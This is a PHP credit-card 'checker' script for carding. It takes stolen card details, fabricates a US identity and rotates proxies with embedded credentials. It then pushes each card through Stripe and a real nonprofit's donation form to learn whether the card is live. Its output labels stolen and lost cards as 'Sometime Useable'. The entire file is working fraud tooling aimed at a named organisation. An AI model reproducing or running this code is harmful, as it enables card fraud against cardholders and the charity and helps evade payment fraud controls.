<?php
/////////////////====== Made with ❤️ by AndryMata ===============\\\\\\\\\\\\\\\\\\\\\


/////Site https://shellmound.org/donate/
include 'function.php';

error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');
if(file_exists(getcwd().('/cookie.txt'))){
@unlink('cookie.txt');
}


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function string_between_two_string($str, $starting_word, $ending_word){ 
$subtring_start = strpos($str, $starting_word); 
$subtring_start += strlen($starting_word);   
$size = strpos($str, $ending_word, $subtring_start) - $subtring_start;   
return substr($str, $subtring_start, $size);
}

function proxys()
{
  $poxyHttps = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxyHttps) - 1);
  $poxyHttps = $poxyHttps[$myproxy];
  return $poxyHttps;
}
$proxy = proxys(); 
//$ip = multiexplode(array(":", "|", ""), $proxy)[0]; 
//echo '[ IP: '.$ip.' ] ';


////////////////////////////===[Randomizing Details edit by Andry

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
$account22 = rand(0000,9999);
$first11 = "".$name."".$last."";
$serve_arr = array("gmail.com","hotmail.com","yahoo.com.br","bol.com.br","protonmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email = "".$account22."".$first11."%40".$serv_rnd."";
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];

$st = array("AL", "NY", "CA", "FL", "WA");
$st1 = array_rand($st);
$state = $st[$st1];
if ($state == "NY"){
$state = "New+York";
$zip = "10080";
$city = "New+York";
}
elseif ($state == "WA"){
$state = "Washington";
$zip = "98001";
$city = "Auburn";
}
elseif ($state == "AL"){
$state = "Alabama";
$zip = "35005";
$city = "Adamsville";
}
elseif ($state == "FL"){
$state = "Florida";
$zip = "32003";
$city = "Orange+Park";
}
else{
$state = "California";
$zip = "90201";
$city = "Bell";
};

//////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////

$Websharegay = rand(0,250);

$rp1 = array(
  1 => 'jluqzwsq-rotate:hxyv1cgdxffz',
  2 => 'lxdaenak-rotate:uwfwcxqib7bh',
  3 => 'kuwhtwcw-rotate:35pfuncskmnb',
  4 => 'kuwhtwcw-'.$Websharegay.':35pfuncskmnb',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];


//////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
//$ip = $ip1;
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$socks5_kurumi."]";
}

//echo '[ IP: '.$ip.' ] ';

///////////////////////==============[End Proxy Section]===============//////////////////////////////




$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'accept: application/json',
'accept-encoding: gzip, deflate, br',
'accept-language: es-ES,es;q=0.9,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/v3/controller-d8d6e2b2034e9242903483760f9094c4.html',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: '.$ua.'',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'type=card&billing_details[name]='.$name.'+'.$last.'&billing_details[email]='.$email.'&billing_details[address][line1]='.$street.'&billing_details[address][line2]=&billing_details[address][city]='.$city.'&billing_details[address][state]='.$state.'&billing_details[address][postal_code]='.$zip.'&billing_details[address][country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F06e73e9f%3B+stripe-js-v3%2F06e73e9f&time_on_page=238428&referrer=https%3A%2F%2Fshellmound.org%2Fdonate%2F&key=pk_live_SMtnnvlq4TpJelMdklNha8iD&_stripe_account=acct_1CNs6WBZkOj8g7sZ');
  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
curl_close($ch);

/////////////////=[3Req]=//////////////////


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://shellmound.org/donate/?payment-mode=stripe');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: shellmound.org',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: es-ES,es;q=0.9,en;q=0.8',
'content-type: application/x-www-form-urlencoded',
'origin: https://shellmound.org',
'referer: https://shellmound.org/donate/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'upgrade-insecure-requests: 1',
'user-agent: '.$ua.'',
));


curl_setopt($ch, CURLOPT_POSTFIELDS, 'give-honeypot=&give-form-id-prefix=1077-1&give-form-id=1077&give-form-title=Shellmound+Defense+Fund&give-current-url=https%3A%2F%2Fshellmound.org%2Fdonate%2F&give-form-url=https%3A%2F%2Fshellmound.org%2Fdonate%2F&give-form-minimum=18.00&give-form-maximum=999999.99&give-form-hash=0b35fd2969&give-price-id=0&give-amount=25.00&give_stripe_payment_method='.$id.'&payment-mode=stripe&give_first='.$name.'&give_last='.$last.'&give_email='.$email.'&card_name='.$name.'&billing_country=US&card_address='.$street.'&card_address_2=&card_city='.$city.'&card_state='.$state.'&card_zip='.$zip.'&give_action=purchase&give-gateway=stripe');

 $result3 = curl_exec($ch);
 


/////////// [Bin Lookup Api] /////////////

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
//$base= $cyrax0p

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);

      
      
/////////////////[Responses]///////////////

if(strpos($result3, '/donations/thank_you?donation_number=','' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "pass",')){
    echo '<span class="badge badge-white">#Aprovada </span></br> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">  『 ★ CVV MATCHED ★ 』 </span> </b></br> <span class="badge badge-white">『 [★𝙕𝙍™]Andry 』</span></br>';
}
elseif(strpos($result3,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"cvc_check": "pass",')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 [★𝙕𝙍™]Andry 』</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 [★𝙕𝙍™]Andry 』</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"status": "succeeded"')){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV MATCHED  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'The zip code you supplied failed validation.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 [★𝙕𝙍™]Andry 』 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_zip" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 [★𝙕𝙍™]Andry 』  )」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Success" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "succeeded." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CVV LIVE  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"fraudulent")){
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Fraudulent Card 『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"fraudulent",)){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★FRAUDULENT CARD - Sometime Useable 『 [★𝙕𝙍™]Andry 』」  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has insufficient funds.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Insufficient Funds  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "insufficient_funds")) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Insufficient Funds  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Lost_Card - Sometime Useable  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "stolen_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Stolen_Card - Sometime Useable  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'security code is incorrect.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
elseif(strpos($result3, "Your card's security code is incorrect." )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'security code is invalid.' )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Pickup Card (Reported Stolen Or Lost) 『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 [★𝙕𝙍™]Andry 』  </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ CCN LIVE  『 [★𝙕𝙍™]Andry 』 ♛  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Pickup Card (Reported Stolen Or Lost) 『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "expired_card" )) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Expired Card  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, 'Your card number is incorrect.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Incorrect Card Number  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_number")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Incorrect Card Number  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result3, "do_not_honor")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Do_Not_Honor  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "generic_decline")) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Generic_Decline  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Card Declined  『 [★𝙕𝙍™]Andry 』 ♛  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Card Declined  『 [★𝙕𝙍™]Andry 』 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, 'Your card was declined.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Card Declined  『 [★𝙕𝙍™]Andry 』 ♛」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result3,'"cvc_check": "unavailable"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Security Code Check : Unavailable [Proxy Dead/change IP]  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result3,'"cvc_check": "fail"')){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Security Code Check : Unavailable [Proxy Dead/change IP]  『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"parameter_invalid_empty")){
    echo '<span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★ Declined : Missing Card Details 『 [★𝙕𝙍™]Andry 』  」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result3,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif (strpos($result3,'Your card does not support this type of purchase.')) {
    echo '<span class="badge badge-success">Aprovadas</span> ◈ </span> </span> <span class="badge badge-success">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 1  『 [★𝙕𝙍™]Andry 』」</span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"transaction_not_allowed")){
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 『 [★𝙕𝙍™]Andry 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"three_d_secure_redirect")){
     echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Card Doesnt Support Purchase 『 [★𝙕𝙍™]Andry 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Card is declined by your bank, please contact them for additional information.')) {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★3D Secure Redirect 『 [★𝙕𝙍™]Andry 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,"missing_payment_information")){
     '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Missing Payment Informations 『 [★𝙕𝙍™]Andry 』  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Payment cannot be processed, missing credit card number")) {
     '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「Missing Credit Card Number_Andry【★яσуαℓ★】  」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
else {
    echo '<span class="badge badge-danger">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-info"> 「★Dead Proxy/Error Not listed 『 [★𝙕𝙍™]Andry 』   」 </span> ◈</span> <span class="badge badge-info"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
curl_close($ch);
ob_flush();
//echo "<b>1REQ Result:</b> $result1<br><br>";
//echo "<b>2REQ Result:</b> $result3<br><br>";
//echo "<b>3REQ Result:</b> $result3<br><br>";
//echo "<b>ipvanish Result:</b> $socks5_kurumi<br><br>";
//echo "<b>server Result:</b>  $server<br><br>";
//echo "<b>token Result:</b> $token<br><br>";
//echo $message1

/////////////////====== Hecho con ❤️ por AndryMata ===============\\\\\\\\\\\\\\\\\\\\\

?>

